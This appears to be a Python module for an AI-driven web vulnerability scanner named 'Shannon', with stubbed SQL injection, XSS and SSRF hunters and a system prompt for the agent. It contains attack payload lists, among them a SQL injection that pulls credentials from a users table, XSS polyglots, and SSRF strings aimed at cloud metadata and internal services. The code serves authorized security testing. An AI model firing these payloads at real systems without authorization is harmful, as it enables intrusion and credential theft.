"""
Shannon-Style Web Security Agent
Implements "Proof by Exploitation" methodology with 96% XBOW benchmark approach.

Key Principles:
- No Exploit, No Report: Only validated vulnerabilities are reported
- White-box + Black-box: Combines source analysis with dynamic testing
- Four Phases: Reconnaissance → Vulnerability Analysis → Exploitation → Reporting
- Parallel Hypothesis Testing: Multiple vulnerability hunters work concurrently
"""
from typing import Dict, Any, Optional, List, Tuple
from pydantic import BaseModel, Field
from datetime import datetime
from enum import Enum
from abc import ABC, abstractmethod
import asyncio
import uuid
import structlog

logger = structlog.get_logger()


class VulnerabilityCategory(str, Enum):
    """OWASP-aligned vulnerability categories."""
    INJECTION = "injection"
    XSS = "xss"
    SSRF = "ssrf"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    DESERIALIZATION = "deserialization"
    BUSINESS_LOGIC = "business_logic"


class ExploitationPhase(str, Enum):
    """Shannon's four-phase methodology."""
    RECONNAISSANCE = "reconnaissance"
    VULNERABILITY_ANALYSIS = "vulnerability_analysis"
    EXPLOITATION = "exploitation"
    REPORTING = "reporting"


class DataFlowSink(str, Enum):
    """Dangerous sinks in data flow analysis."""
    SQL_QUERY = "sql_query"
    COMMAND_EXEC = "command_exec"
    FILE_OPERATION = "file_operation"
    HTTP_REQUEST = "http_request"
    HTML_OUTPUT = "html_output"
    DESERIALIZE = "deserialize"
    REDIRECT = "redirect"


class DataFlowTrace(BaseModel):
    """Traces user input from source to sink."""
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    source: str  # Where user input enters
    sink: DataFlowSink  # Where it ends up (dangerous operation)
    path: List[str]  # Functions/methods along the way
    sanitization: List[str] = Field(default_factory=list)  # Any sanitization applied
    vulnerable: bool = False
    confidence: float = 0.0


class VulnerabilityHypothesis(BaseModel):
    """
    A hypothesis about a potential vulnerability.
    Must be validated through exploitation to become a finding.
    """
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    category: VulnerabilityCategory
    endpoint: str
    parameter: str
    method: str = "GET"

    # Analysis data
    data_flow: Optional[DataFlowTrace] = None
    attack_vector: str = ""
    payload_candidates: List[str] = Field(default_factory=list)

    # Validation state
    tested: bool = False
    exploited: bool = False
    proof_of_concept: Optional[str] = None
    response_evidence: Optional[str] = None

    # Confidence tracking
    hypothesis_confidence: float = 0.5  # Pre-exploitation confidence
    exploitation_confidence: float = 0.0  # Post-exploitation confidence

    # Timestamps
    created_at: datetime = Field(default_factory=datetime.utcnow)
    tested_at: Optional[datetime] = None
    exploited_at: Optional[datetime] = None


class ValidatedFinding(BaseModel):
    """
    A finding that has been validated through successful exploitation.
    Shannon's "No Exploit, No Report" principle.
    """
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    hypothesis_id: str
    category: VulnerabilityCategory
    title: str
    description: str
    severity: str

    # Exploitation proof
    endpoint: str
    parameter: str
    payload: str
    proof_of_concept: str
    response_evidence: str

    # Reproduction steps
    reproduction_steps: List[str] = Field(default_factory=list)

    # Impact analysis
    impact: str = ""
    cvss_estimate: Optional[float] = None

    # Remediation
    remediation: str = ""

    # Metadata
    discovered_at: datetime = Field(default_factory=datetime.utcnow)
    validated_at: datetime = Field(default_factory=datetime.utcnow)


class AttackSurface(BaseModel):
    """Discovered attack surface from reconnaissance."""
    endpoints: List[Dict[str, Any]] = Field(default_factory=list)
    parameters: List[Dict[str, Any]] = Field(default_factory=list)
    forms: List[Dict[str, Any]] = Field(default_factory=list)
    api_endpoints: List[Dict[str, Any]] = Field(default_factory=list)
    javascript_sinks: List[str] = Field(default_factory=list)
    technologies: List[str] = Field(default_factory=list)
    authentication_endpoints: List[str] = Field(default_factory=list)


class VulnerabilityHunter(ABC):
    """
    Base class for specialized vulnerability hunters.
    Each hunter focuses on a specific vulnerability category.
    """

    category: VulnerabilityCategory
    name: str = "base_hunter"

    def __init__(self):
        self.logger = structlog.get_logger(hunter=self.name)

    @abstractmethod
    async def generate_hypotheses(
        self,
        attack_surface: AttackSurface,
        data_flows: List[DataFlowTrace]
    ) -> List[VulnerabilityHypothesis]:
        """Generate vulnerability hypotheses based on attack surface."""
        pass

    @abstractmethod
    async def test_hypothesis(
        self,
        hypothesis: VulnerabilityHypothesis,
        executor: Any
    ) -> VulnerabilityHypothesis:
        """Test a hypothesis through active exploitation."""
        pass

    @abstractmethod
    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate attack payloads for testing."""
        pass


class SQLInjectionHunter(VulnerabilityHunter):
    """Hunter for SQL Injection vulnerabilities."""

    category = VulnerabilityCategory.INJECTION
    name = "sqli_hunter"

    # SQL injection payloads for different contexts
    PAYLOADS = {
        "detection": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND '1'='1",
            "1 AND 1=1",
            "' UNION SELECT NULL--",
            "') OR ('1'='1",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
        ],
        "error_based": [
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a'--",
        ]
    }

    async def generate_hypotheses(
        self,
        attack_surface: AttackSurface,
        data_flows: List[DataFlowTrace]
    ) -> List[VulnerabilityHypothesis]:
        """Generate SQL injection hypotheses."""
        hypotheses = []

        # From data flow analysis - highest confidence
        for flow in data_flows:
            if flow.sink == DataFlowSink.SQL_QUERY:
                confidence = 0.8 if not flow.sanitization else 0.4
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=flow.source,
                    parameter=flow.path[-1] if flow.path else "unknown",
                    attack_vector=f"Data flows to SQL sink via: {' → '.join(flow.path)}",
                    hypothesis_confidence=confidence,
                    data_flow=flow,
                    payload_candidates=self.generate_payloads({"type": "detection"})
                ))

        # From attack surface - moderate confidence
        for param in attack_surface.parameters:
            if self._is_likely_sql_target(param):
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=param.get("endpoint", ""),
                    parameter=param.get("name", ""),
                    method=param.get("method", "GET"),
                    attack_vector=f"Parameter '{param.get('name')}' may be used in SQL query",
                    hypothesis_confidence=0.5,
                    payload_candidates=self.generate_payloads({"type": "detection"})
                ))

        self.logger.info(f"Generated {len(hypotheses)} SQLi hypotheses")
        return hypotheses

    def _is_likely_sql_target(self, param: Dict[str, Any]) -> bool:
        """Heuristic to identify likely SQL injection targets."""
        sql_indicators = ["id", "user", "name", "search", "query", "filter", "sort", "order"]
        param_name = param.get("name", "").lower()
        return any(indicator in param_name for indicator in sql_indicators)

    async def test_hypothesis(
        self,
        hypothesis: VulnerabilityHypothesis,
        executor: Any
    ) -> VulnerabilityHypothesis:
        """Test SQL injection hypothesis through active exploitation."""
        self.logger.info(f"Testing SQLi hypothesis: {hypothesis.endpoint}/{hypothesis.parameter}")

        hypothesis.tested = True
        hypothesis.tested_at = datetime.utcnow()

        # Test detection payloads first
        for payload in hypothesis.payload_candidates:
            result = await self._test_payload(hypothesis, payload, executor)

            if result["vulnerable"]:
                hypothesis.exploited = True
                hypothesis.exploited_at = datetime.utcnow()
                hypothesis.proof_of_concept = payload
                hypothesis.response_evidence = result["evidence"]
                hypothesis.exploitation_confidence = result["confidence"]
                break

        return hypothesis

    async def _test_payload(
        self,
        hypothesis: VulnerabilityHypothesis,
        payload: str,
        executor: Any
    ) -> Dict[str, Any]:
        """Test a single payload and analyze response."""
        # This would integrate with the MCP engine for actual requests
        # For now, return structure showing expected behavior

        # In real implementation:
        # 1. Send request with payload
        # 2. Analyze response for SQL error messages
        # 3. Compare timing for time-based detection
        # 4. Check for data exfiltration in union attacks

        return {
            "vulnerable": False,
            "evidence": "",
            "confidence": 0.0,
            "response_time": 0,
            "response_body": ""
        }

    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate SQL injection payloads."""
        payload_type = context.get("type", "detection")
        return self.PAYLOADS.get(payload_type, self.PAYLOADS["detection"])


class XSSHunter(VulnerabilityHunter):
    """Hunter for Cross-Site Scripting vulnerabilities."""

    category = VulnerabilityCategory.XSS
    name = "xss_hunter"

    PAYLOADS = {
        "reflected": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ],
        "attribute_escape": [
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(1)' autofocus='",
            "\" onfocus=\"alert(1)\" autofocus=\"",
        ],
        "dom_based": [
            "#<script>alert('XSS')</script>",
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert('XSS')</script>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</script><script>alert(1)</script>",
        ]
    }

    async def generate_hypotheses(
        self,
        attack_surface: AttackSurface,
        data_flows: List[DataFlowTrace]
    ) -> List[VulnerabilityHypothesis]:
        """Generate XSS hypotheses."""
        hypotheses = []

        # From data flow - HTML output sinks
        for flow in data_flows:
            if flow.sink == DataFlowSink.HTML_OUTPUT:
                confidence = 0.7 if not flow.sanitization else 0.3
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=flow.source,
                    parameter=flow.path[-1] if flow.path else "unknown",
                    attack_vector=f"User input rendered in HTML: {' → '.join(flow.path)}",
                    hypothesis_confidence=confidence,
                    data_flow=flow,
                    payload_candidates=self.generate_payloads({"type": "reflected"})
                ))

        # From attack surface - parameters that might be reflected
        for param in attack_surface.parameters:
            if self._is_likely_xss_target(param):
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=param.get("endpoint", ""),
                    parameter=param.get("name", ""),
                    method=param.get("method", "GET"),
                    attack_vector=f"Parameter '{param.get('name')}' may be reflected in response",
                    hypothesis_confidence=0.4,
                    payload_candidates=self.generate_payloads({"type": "reflected"})
                ))

        # DOM-based XSS from JavaScript sinks
        for sink in attack_surface.javascript_sinks:
            hypotheses.append(VulnerabilityHypothesis(
                category=self.category,
                endpoint=sink,
                parameter="fragment",
                method="GET",
                attack_vector=f"JavaScript sink detected: {sink}",
                hypothesis_confidence=0.5,
                payload_candidates=self.generate_payloads({"type": "dom_based"})
            ))

        self.logger.info(f"Generated {len(hypotheses)} XSS hypotheses")
        return hypotheses

    def _is_likely_xss_target(self, param: Dict[str, Any]) -> bool:
        """Heuristic to identify likely XSS targets."""
        xss_indicators = ["search", "query", "q", "name", "message", "comment", "text", "input"]
        param_name = param.get("name", "").lower()
        return any(indicator in param_name for indicator in xss_indicators)

    async def test_hypothesis(
        self,
        hypothesis: VulnerabilityHypothesis,
        executor: Any
    ) -> VulnerabilityHypothesis:
        """Test XSS hypothesis."""
        self.logger.info(f"Testing XSS hypothesis: {hypothesis.endpoint}/{hypothesis.parameter}")

        hypothesis.tested = True
        hypothesis.tested_at = datetime.utcnow()

        for payload in hypothesis.payload_candidates:
            result = await self._test_payload(hypothesis, payload, executor)

            if result["vulnerable"]:
                hypothesis.exploited = True
                hypothesis.exploited_at = datetime.utcnow()
                hypothesis.proof_of_concept = payload
                hypothesis.response_evidence = result["evidence"]
                hypothesis.exploitation_confidence = result["confidence"]
                break

        return hypothesis

    async def _test_payload(
        self,
        hypothesis: VulnerabilityHypothesis,
        payload: str,
        executor: Any
    ) -> Dict[str, Any]:
        """Test XSS payload."""
        # Real implementation would:
        # 1. Inject payload
        # 2. Check if payload appears unencoded in response
        # 3. Use browser automation to verify JavaScript execution

        return {
            "vulnerable": False,
            "evidence": "",
            "confidence": 0.0
        }

    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate XSS payloads."""
        payload_type = context.get("type", "reflected")
        return self.PAYLOADS.get(payload_type, self.PAYLOADS["reflected"])


class SSRFHunter(VulnerabilityHunter):
    """Hunter for Server-Side Request Forgery vulnerabilities."""

    category = VulnerabilityCategory.SSRF
    name = "ssrf_hunter"

    PAYLOADS = {
        "basic": [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
        ],
        "bypass": [
            "http://127.1",
            "http://0.0.0.0",
            "http://0",
            "http://2130706433",  # Decimal IP
            "http://0x7f000001",  # Hex IP
            "http://127.0.0.1.nip.io",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        ],
        "internal_services": [
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:11211",  # Memcached
            "http://127.0.0.1:9200",  # Elasticsearch
        ]
    }

    async def generate_hypotheses(
        self,
        attack_surface: AttackSurface,
        data_flows: List[DataFlowTrace]
    ) -> List[VulnerabilityHypothesis]:
        """Generate SSRF hypotheses."""
        hypotheses = []

        # From data flow - HTTP request sinks
        for flow in data_flows:
            if flow.sink == DataFlowSink.HTTP_REQUEST:
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=flow.source,
                    parameter=flow.path[-1] if flow.path else "url",
                    attack_vector=f"User input used in HTTP request: {' → '.join(flow.path)}",
                    hypothesis_confidence=0.8,
                    data_flow=flow,
                    payload_candidates=self.generate_payloads({"type": "basic"})
                ))

        # From attack surface - URL parameters
        for param in attack_surface.parameters:
            if self._is_likely_ssrf_target(param):
                hypotheses.append(VulnerabilityHypothesis(
                    category=self.category,
                    endpoint=param.get("endpoint", ""),
                    parameter=param.get("name", ""),
                    method=param.get("method", "GET"),
                    attack_vector=f"URL parameter '{param.get('name')}' may be fetched server-side",
                    hypothesis_confidence=0.6,
                    payload_candidates=self.generate_payloads({"type": "basic"})
                ))

        self.logger.info(f"Generated {len(hypotheses)} SSRF hypotheses")
        return hypotheses

    def _is_likely_ssrf_target(self, param: Dict[str, Any]) -> bool:
        """Heuristic to identify likely SSRF targets."""
        ssrf_indicators = ["url", "uri", "link", "src", "href", "path", "dest", "redirect", "next", "callback"]
        param_name = param.get("name", "").lower()
        return any(indicator in param_name for indicator in ssrf_indicators)

    async def test_hypothesis(
        self,
        hypothesis: VulnerabilityHypothesis,
        executor: Any
    ) -> VulnerabilityHypothesis:
        """Test SSRF hypothesis."""
        self.logger.info(f"Testing SSRF hypothesis: {hypothesis.endpoint}/{hypothesis.parameter}")

        hypothesis.tested = True
        hypothesis.tested_at = datetime.utcnow()

        # Would use out-of-band detection (e.g., Collaborator-style)
        for payload in hypothesis.payload_candidates:
            result = await self._test_payload(hypothesis, payload, executor)

            if result["vulnerable"]:
                hypothesis.exploited = True
                hypothesis.exploited_at = datetime.utcnow()
                hypothesis.proof_of_concept = payload
                hypothesis.response_evidence = result["evidence"]
                hypothesis.exploitation_confidence = result["confidence"]
                break

        return hypothesis

    async def _test_payload(
        self,
        hypothesis: VulnerabilityHypothesis,
        payload: str,
        executor: Any
    ) -> Dict[str, Any]:
        """Test SSRF payload."""
        return {"vulnerable": False, "evidence": "", "confidence": 0.0}

    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate SSRF payloads."""
        payload_type = context.get("type", "basic")
        return self.PAYLOADS.get(payload_type, self.PAYLOADS["basic"])


class ShannonWebAgent:
    """
    Main Shannon-style web security agent.
    Implements the complete "Proof by Exploitation" methodology.
    """

    SYSTEM_PROMPT = """You are Shannon, an expert AI web security analyst following the
"Proof by Exploitation" methodology. Your core principles:

1. NO EXPLOIT, NO REPORT: Only report vulnerabilities that have been validated
   through successful exploitation. Hypotheses without proof are discarded.

2. WHITE-BOX + BLACK-BOX: Combine source code analysis (when available) with
   dynamic testing for maximum coverage.

3. DATA FLOW ANALYSIS: Trace user inputs from entry points (sources) to
   dangerous operations (sinks). Identify missing or insufficient sanitization.

4. HYPOTHESIS-DRIVEN: Generate specific, testable hypotheses about vulnerabilities.
   Each hypothesis must have:
   - Clear attack vector
   - Specific payload candidates
   - Expected behavior if vulnerable
   - Method to verify exploitation

5. PARALLEL HUNTING: Test multiple vulnerability categories simultaneously
   using specialized hunters for each category.

Your output must be precise, actionable, and evidence-based. False positives
are worse than missed findings - always validate before reporting."""

    def __init__(self, mcp_engine: Any = None, memory_system: Any = None, llm_client: Any = None):
        self.mcp_engine = mcp_engine
        self.memory = memory_system
        self.llm = llm_client

        # Initialize specialized hunters
        self.hunters: Dict[VulnerabilityCategory, VulnerabilityHunter] = {
            VulnerabilityCategory.INJECTION: SQLInjectionHunter(),
            VulnerabilityCategory.XSS: XSSHunter(),
            VulnerabilityCategory.SSRF: SSRFHunter(),
        }

        self.logger = structlog.get_logger(agent="shannon")

    async def run_assessment(
        self,
        target: str,
        scope: Dict[str, Any],
        source_code: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Run a complete web security assessment following Shannon's methodology.

        Args:
            target: Target URL or application
            scope: Assessment scope and constraints
            source_code: Optional source code for white-box analysis

        Returns:
            Assessment results with only validated findings
        """
        self.logger.info("Starting Shannon assessment", target=target)

        results = {
            "target": target,
            "started_at": datetime.utcnow().isoformat(),
            "phases": {},
            "hypotheses_generated": 0,
            "hypotheses_tested": 0,
            "validated_findings": [],
            "false_positives_eliminated": 0
        }

        # Phase 1: Reconnaissance
        self.logger.info("Phase 1: Reconnaissance")
        attack_surface = await self._reconnaissance(target, scope)
        results["phases"]["reconnaissance"] = {
            "endpoints": len(attack_surface.endpoints),
            "parameters": len(attack_surface.parameters),
            "forms": len(attack_surface.forms)
        }

        # Phase 2: Vulnerability Analysis
        self.logger.info("Phase 2: Vulnerability Analysis")
        data_flows = await self._analyze_data_flows(attack_surface, source_code)
        hypotheses = await self._generate_all_hypotheses(attack_surface, data_flows)
        results["hypotheses_generated"] = len(hypotheses)
        results["phases"]["vulnerability_analysis"] = {
            "data_flows_traced": len(data_flows),
            "hypotheses": len(hypotheses)
        }

        # Phase 3: Exploitation (Proof by Exploitation)
        self.logger.info("Phase 3: Exploitation")
        validated = await self._exploit_and_validate(hypotheses)
        results["hypotheses_tested"] = len([h for h in hypotheses if h.tested])
        results["false_positives_eliminated"] = len([h for h in hypotheses if h.tested and not h.exploited])
        results["phases"]["exploitation"] = {
            "tested": results["hypotheses_tested"],
            "validated": len(validated),
            "eliminated": results["false_positives_eliminated"]
        }

        # Phase 4: Reporting (only validated findings)
        self.logger.info("Phase 4: Reporting")
        findings = self._generate_findings(validated)
        results["validated_findings"] = [f.model_dump() for f in findings]
        results["phases"]["reporting"] = {
            "findings_count": len(findings),
            "severity_breakdown": self._severity_breakdown(findings)
        }

        results["completed_at"] = datetime.utcnow().isoformat()

        return results

    async def _reconnaissance(
        self,
        target: str,
        scope: Dict[str, Any]
    ) -> AttackSurface:
        """
        Phase 1: Reconnaissance
        Maps the attack surface through active and passive discovery.
        """
        attack_surface = AttackSurface()

        # Web crawling and endpoint discovery
        # In real implementation, would use browser automation and crawlers

        # Discover endpoints
        attack_surface.endpoints = [
            {"url": f"{target}/", "method": "GET"},
            {"url": f"{target}/login", "method": "GET"},
            {"url": f"{target}/login", "method": "POST"},
            {"url": f"{target}/search", "method": "GET"},
            {"url": f"{target}/api/users", "method": "GET"},
        ]

        # Discover parameters
        attack_surface.parameters = [
            {"endpoint": f"{target}/search", "name": "q", "method": "GET", "type": "query"},
            {"endpoint": f"{target}/login", "name": "username", "method": "POST", "type": "body"},
            {"endpoint": f"{target}/login", "name": "password", "method": "POST", "type": "body"},
            {"endpoint": f"{target}/api/users", "name": "id", "method": "GET", "type": "query"},
        ]

        # Discover forms
        attack_surface.forms = [
            {"action": f"{target}/login", "method": "POST", "fields": ["username", "password"]},
            {"action": f"{target}/search", "method": "GET", "fields": ["q"]},
        ]

        # Identify technologies
        attack_surface.technologies = ["PHP", "MySQL", "Apache"]

        self.logger.info(
            "Reconnaissance complete",
            endpoints=len(attack_surface.endpoints),
            parameters=len(attack_surface.parameters)
        )

        return attack_surface

    async def _analyze_data_flows(
        self,
        attack_surface: AttackSurface,
        source_code: Optional[str]
    ) -> List[DataFlowTrace]:
        """
        Analyze data flows from user inputs to dangerous sinks.
        This is Shannon's white-box analysis component.
        """
        data_flows = []

        if source_code:
            # Real implementation would parse source code and trace data flows
            # For now, generate sample flows based on common patterns

            # Example: Search parameter flowing to SQL query
            data_flows.append(DataFlowTrace(
                source="/search?q=",
                sink=DataFlowSink.SQL_QUERY,
                path=["$_GET['q']", "searchProducts()", "mysqli_query()"],
                sanitization=[],
                vulnerable=True,
                confidence=0.8
            ))

            # Example: Username reflected in page
            data_flows.append(DataFlowTrace(
                source="/profile?name=",
                sink=DataFlowSink.HTML_OUTPUT,
                path=["$_GET['name']", "displayProfile()", "echo"],
                sanitization=["htmlspecialchars"],
                vulnerable=False,
                confidence=0.3
            ))

        self.logger.info(f"Traced {len(data_flows)} data flows")
        return data_flows

    async def _generate_all_hypotheses(
        self,
        attack_surface: AttackSurface,
        data_flows: List[DataFlowTrace]
    ) -> List[VulnerabilityHypothesis]:
        """
        Generate vulnerability hypotheses using all hunters in parallel.
        """
        all_hypotheses = []

        # Run all hunters in parallel
        tasks = [
            hunter.generate_hypotheses(attack_surface, data_flows)
            for hunter in self.hunters.values()
        ]

        results = await asyncio.gather(*tasks)

        for hunter_hypotheses in results:
            all_hypotheses.extend(hunter_hypotheses)

        # Sort by confidence
        all_hypotheses.sort(key=lambda h: h.hypothesis_confidence, reverse=True)

        self.logger.info(f"Generated {len(all_hypotheses)} total hypotheses")
        return all_hypotheses

    async def _exploit_and_validate(
        self,
        hypotheses: List[VulnerabilityHypothesis]
    ) -> List[VulnerabilityHypothesis]:
        """
        Phase 3: Exploitation
        Test all hypotheses and return only those that are successfully exploited.
        This is the core of "Proof by Exploitation".
        """
        validated = []

        for hypothesis in hypotheses:
            hunter = self.hunters.get(hypothesis.category)
            if not hunter:
                continue

            # Test the hypothesis
            tested_hypothesis = await hunter.test_hypothesis(hypothesis, self.mcp_engine)

            if tested_hypothesis.exploited:
                validated.append(tested_hypothesis)
                self.logger.info(
                    "Hypothesis validated",
                    category=hypothesis.category.value,
                    endpoint=hypothesis.endpoint,
                    poc=tested_hypothesis.proof_of_concept
                )
            else:
                self.logger.debug(
                    "Hypothesis invalidated (false positive eliminated)",
                    category=hypothesis.category.value,
                    endpoint=hypothesis.endpoint
                )

        self.logger.info(f"Validated {len(validated)} of {len(hypotheses)} hypotheses")
        return validated

    def _generate_findings(
        self,
        validated_hypotheses: List[VulnerabilityHypothesis]
    ) -> List[ValidatedFinding]:
        """
        Phase 4: Reporting
        Generate findings only for validated hypotheses.
        """
        findings = []

        severity_mapping = {
            VulnerabilityCategory.INJECTION: "critical",
            VulnerabilityCategory.COMMAND_INJECTION: "critical",
            VulnerabilityCategory.XSS: "high",
            VulnerabilityCategory.SSRF: "high",
            VulnerabilityCategory.AUTH_BYPASS: "critical",
            VulnerabilityCategory.IDOR: "high",
            VulnerabilityCategory.PATH_TRAVERSAL: "high",
            VulnerabilityCategory.XXE: "high",
            VulnerabilityCategory.DESERIALIZATION: "critical",
            VulnerabilityCategory.BUSINESS_LOGIC: "medium",
        }

        for hypothesis in validated_hypotheses:
            finding = ValidatedFinding(
                hypothesis_id=hypothesis.id,
                category=hypothesis.category,
                title=f"{hypothesis.category.value.upper()} in {hypothesis.endpoint}",
                description=hypothesis.attack_vector,
                severity=severity_mapping.get(hypothesis.category, "medium"),
                endpoint=hypothesis.endpoint,
                parameter=hypothesis.parameter,
                payload=hypothesis.proof_of_concept or "",
                proof_of_concept=hypothesis.proof_of_concept or "",
                response_evidence=hypothesis.response_evidence or "",
                reproduction_steps=[
                    f"1. Navigate to {hypothesis.endpoint}",
                    f"2. Inject payload into parameter '{hypothesis.parameter}'",
                    f"3. Payload: {hypothesis.proof_of_concept}",
                    f"4. Observe: {hypothesis.response_evidence}"
                ],
                remediation=self._get_remediation(hypothesis.category)
            )
            findings.append(finding)

        return findings

    def _get_remediation(self, category: VulnerabilityCategory) -> str:
        """Get remediation advice for a vulnerability category."""
        remediations = {
            VulnerabilityCategory.INJECTION: "Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.",
            VulnerabilityCategory.XSS: "Encode all user output. Use Content-Security-Policy headers. Validate and sanitize input.",
            VulnerabilityCategory.SSRF: "Validate and whitelist allowed URLs. Block internal IP ranges. Use a proxy for external requests.",
            VulnerabilityCategory.AUTH_BYPASS: "Implement proper authentication checks. Use established authentication frameworks.",
            VulnerabilityCategory.IDOR: "Implement proper authorization checks. Use indirect references instead of direct object IDs.",
            VulnerabilityCategory.COMMAND_INJECTION: "Avoid shell commands. Use parameterized APIs. Validate and sanitize all input.",
        }
        return remediations.get(category, "Review and fix the vulnerability according to OWASP guidelines.")

    def _severity_breakdown(self, findings: List[ValidatedFinding]) -> Dict[str, int]:
        """Calculate severity breakdown of findings."""
        breakdown = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for finding in findings:
            severity = finding.severity.lower()
            if severity in breakdown:
                breakdown[severity] += 1
        return breakdown
